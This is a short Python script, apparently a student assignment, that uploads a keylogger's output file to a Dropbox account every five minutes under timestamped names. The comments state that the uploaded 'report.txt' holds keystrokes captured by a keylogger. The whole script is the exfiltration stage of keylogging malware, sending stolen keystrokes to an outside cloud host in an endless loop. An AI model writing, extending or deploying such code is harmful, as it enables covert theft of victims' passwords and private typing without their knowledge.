import dropbox
import time
import datetime

# Dropbox API (Expires every 4hrs. Dear lecturers, if testing this application yourself please do the following)
# 1. Create Dropbox account (or sign in with Google) 2. Go to dropbox.com/developers 3. Create a new App 4. Generate new API key. 5. Allow everything permissions.
access_token = "[Place your key here]"

# Establishing connection with dropbox
dbx = dropbox.Dropbox(access_token)

def upload_file(file_path, file_name):
    try:
        with open(file_path, "rb") as f:
            dbx.files_upload(f.read(), "/" + file_name, mode=dropbox.files.WriteMode.overwrite)
        print("File uploaded successfully.") # Sucessful upload notification
    except Exception as e:
        print(f"Failed to upload file: {e}") # Failure to upload notification with {e} to display the exception a.k.a issue from Dropbox

if __name__ == "__main__":
    # Replace with the path to the .txt file you want to upload
    file_path = "C:/DownloadedFiles/report.txt" # The file it uploads, keylogger file which updates each time a key is stroked.

    # The code is on sleep, every 5 minutes it uploads to the dropbox
    while True:
        current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") # Adds time stamp to our .txt file to avoid overwrite in the dropbox.
        file_name = f"report_{current_time}.txt"
        upload_file(file_path, file_name)
        time.sleep(300) # 5 minutes
